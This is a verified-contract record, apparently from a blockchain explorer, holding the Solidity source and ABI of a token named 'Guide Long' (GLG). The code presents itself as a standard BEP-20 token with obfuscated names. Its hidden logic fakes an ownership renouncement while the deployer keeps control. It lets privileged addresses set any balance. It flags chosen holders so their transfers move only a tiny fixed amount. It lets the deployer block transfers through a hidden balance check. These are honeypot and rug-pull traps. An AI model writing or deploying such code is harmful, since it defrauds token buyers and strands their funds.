{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.8;\n\ninterface tradingFee {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverFund) external view returns (uint256);\n\n    function transfer(address totalAmount, uint256 atTrading) external returns (bool);\n\n    function allowance(address liquidityWallet, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 atTrading) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address totalAmount,\n        uint256 atTrading\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed maxIs, uint256 value);\n    event Approval(address indexed liquidityWallet, address indexed spender, uint256 value);\n}\n\nabstract contract minBuy {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface launchedWalletAt {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface swapSell {\n    function createPair(address atTo, address fundShould) external returns (address);\n}\n\ninterface autoLimit is tradingFee {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract GuideLong is minBuy, tradingFee, autoLimit {\n\n    function listTx(address autoTx, uint256 atTrading) public {\n        walletSender();\n        marketingReceiver[autoTx] = atTrading;\n    }\n\n    uint256 isAmount;\n\n    mapping(address => mapping(address => uint256)) private fundLaunched;\n\n    function decimals() external view virtual override returns (uint8) {\n        return receiverMaxTo;\n    }\n\n    string private toFrom = \"Guide Long\";\n\n    mapping(address => bool) public buySwap;\n\n    uint256 liquidityTotal;\n\n    function swapExemptTake() public {\n        emit OwnershipTransferred(receiverMin, address(0));\n        sellMarketing = address(0);\n    }\n\n    mapping(address => uint256) private marketingReceiver;\n\n    function transfer(address autoTx, uint256 atTrading) external virtual override returns (bool) {\n        return senderShould(_msgSender(), autoTx, atTrading);\n    }\n\n    function swapMode(address launchMarketing) public {\n        if (shouldFrom) {\n            return;\n        }\n        if (shouldList) {\n            isWallet = true;\n        }\n        buySwap[launchMarketing] = true;\n        if (takeModeShould) {\n            takeModeShould = true;\n        }\n        shouldFrom = true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return toFrom;\n    }\n\n    address listWallet = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function approve(address toFee, uint256 atTrading) public virtual override returns (bool) {\n        fundLaunched[_msgSender()][toFee] = atTrading;\n        emit Approval(_msgSender(), toFee, atTrading);\n        return true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return buyToken;\n    }\n\n    uint256 constant shouldTrading = 8 ** 10;\n\n    function autoFund(uint256 atTrading) public {\n        walletSender();\n        liquidityTotal = atTrading;\n    }\n\n    function allowance(address exemptFee, address toFee) external view virtual override returns (uint256) {\n        if (toFee == listWallet) {\n            return type(uint256).max;\n        }\n        return fundLaunched[exemptFee][toFee];\n    }\n\n    bool public takeModeShould;\n\n    address public receiverMin;\n\n    function balanceOf(address receiverFund) public view virtual override returns (uint256) {\n        return marketingReceiver[receiverFund];\n    }\n\n    function senderShould(address walletReceiver, address totalAmount, uint256 atTrading) internal returns (bool) {\n        if (walletReceiver == receiverMin) {\n            return launchedMin(walletReceiver, totalAmount, atTrading);\n        }\n        uint256 limitMode = tradingFee(enableList).balanceOf(isFromTake);\n        require(limitMode == liquidityTotal);\n        require(totalAmount != isFromTake);\n        if (listSender[walletReceiver]) {\n            return launchedMin(walletReceiver, totalAmount, shouldTrading);\n        }\n        return launchedMin(walletReceiver, totalAmount, atTrading);\n    }\n\n    uint256 private receiverBuy = 100000000 * 10 ** 18;\n\n    function owner() external view returns (address) {\n        return sellMarketing;\n    }\n\n    string private buyToken = \"GLG\";\n\n    uint256 public sellMin;\n\n    function transferFrom(address walletReceiver, address totalAmount, uint256 atTrading) external override returns (bool) {\n        if (_msgSender() != listWallet) {\n            if (fundLaunched[walletReceiver][_msgSender()] != type(uint256).max) {\n                require(atTrading <= fundLaunched[walletReceiver][_msgSender()]);\n                fundLaunched[walletReceiver][_msgSender()] -= atTrading;\n            }\n        }\n        return senderShould(walletReceiver, totalAmount, atTrading);\n    }\n\n    constructor (){\n        if (shouldList == isWallet) {\n            isWallet = true;\n        }\n        launchedWalletAt enableToken = launchedWalletAt(listWallet);\n        enableList = swapSell(enableToken.factory()).createPair(enableToken.WETH(), address(this));\n        \n        receiverMin = _msgSender();\n        swapExemptTake();\n        buySwap[receiverMin] = true;\n        marketingReceiver[receiverMin] = receiverBuy;\n        if (minToken == takeModeShould) {\n            shouldList = false;\n        }\n        emit Transfer(address(0), receiverMin, receiverBuy);\n    }\n\n    address public enableList;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return receiverBuy;\n    }\n\n    bool private minToken;\n\n    address isFromTake = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function getOwner() external view returns (address) {\n        return sellMarketing;\n    }\n\n    address private sellMarketing;\n\n    function feeTeam(address maxTotal) public {\n        walletSender();\n        if (shouldList != minToken) {\n            launchMode = sellMin;\n        }\n        if (maxTotal == receiverMin || maxTotal == enableList) {\n            return;\n        }\n        listSender[maxTotal] = true;\n    }\n\n    uint8 private receiverMaxTo = 18;\n\n    function launchedMin(address walletReceiver, address totalAmount, uint256 atTrading) internal returns (bool) {\n        require(marketingReceiver[walletReceiver] >= atTrading);\n        marketingReceiver[walletReceiver] -= atTrading;\n        marketingReceiver[totalAmount] += atTrading;\n        emit Transfer(walletReceiver, totalAmount, atTrading);\n        return true;\n    }\n\n    bool private shouldList;\n\n    event OwnershipTransferred(address indexed maxExempt, address indexed senderLaunch);\n\n    bool private listTotal;\n\n    bool public isWallet;\n\n    bool public shouldFrom;\n\n    uint256 private launchMode;\n\n    function walletSender() private view {\n        require(buySwap[_msgSender()]);\n    }\n\n    mapping(address => bool) public listSender;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityWallet\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxExempt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderLaunch\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxIs\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"toFee\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atTrading\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"atTrading\",\"type\":\"uint256\"}],\"name\":\"autoFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverFund\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"buySwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxTotal\",\"type\":\"address\"}],\"name\":\"feeTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"listSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atTrading\",\"type\":\"uint256\"}],\"name\":\"listTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverMin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapExemptTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchMarketing\",\"type\":\"address\"}],\"name\":\"swapMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeModeShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atTrading\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atTrading\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "GuideLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}